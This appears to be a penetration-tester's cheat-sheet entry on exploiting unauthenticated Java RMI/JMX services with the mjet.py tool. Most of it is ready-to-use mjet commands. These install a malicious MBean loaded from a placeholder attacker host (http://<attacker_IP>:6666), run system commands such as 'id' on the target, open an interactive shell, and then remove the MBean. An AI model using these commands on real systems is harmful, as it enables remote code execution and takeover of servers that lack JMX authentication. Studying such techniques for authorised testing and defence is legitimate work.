## Port XXXX - Java RMI - JMX
**Command execution:**  
Use mjet.py : https://github.com/mogwailabs/mjet   
JMX is used to manage remote Java resources such as MBeans. If no authentication is configured, it is possible to list the differents MBeans:  
Install jdk and use the `jconsole` binary in `\Java\jdk-18.0.2\bin\jconsole.exe` to access the service.  
it is thus possible to install a malicious MBean and execute commands:  
  
Example commands : `jython mjet.py target.test.com 18051 install tonkabean http://<attacker_IP>:6666 6666`  
`jython mjet.py target.test.com 18051 command tonkabean "id"`  
`jython mjet.py target.test.com 18051 shell tonkabean`  
Uninstall the malicious MBean at the end : `jython mjet.py target.test.com 18051 uninstall`
